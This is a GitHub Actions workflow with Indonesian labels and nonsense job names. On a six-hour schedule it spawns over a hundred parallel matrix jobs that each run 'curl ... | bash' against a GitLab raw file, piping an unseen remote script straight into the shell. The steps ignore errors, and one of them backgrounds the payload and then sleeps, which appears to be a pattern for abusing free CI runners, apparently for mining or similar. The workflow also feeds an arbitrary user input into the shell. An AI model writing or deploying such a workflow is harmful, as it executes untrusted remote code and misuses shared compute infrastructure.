name: iokoi

on:
  workflow_dispatch:
    inputs:
      command:
        description: 'Perintah untuk job nert & dert'
        required: false
        default: 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash'
  schedule:
    - cron: '0 */6 * * *'   # setiap 6 jam

jobs:
  hert:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [A.1, B.1]
        flag: [A, B, C, D, E, F, G, H, I, J]
    steps:
      - name: hertob
        continue-on-error: true
        run: echo hert

  nert:
    needs: [hert]
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [C.1, D.1, D.2, D.3, D.4, D.5]
        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N]
    steps:
      - name: Jalankan perintah (default)
        continue-on-error: true
        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}  &
           sleep 325s

  dert:
    needs: [nert]
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [E.1, F.1, F.2, F.3, F.4, F.5, F.6, F.7]
        flag: [A, B, C, D, E, F, G, H, I, J]
    steps:
      - name: dertjob
        continue-on-error: true
        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}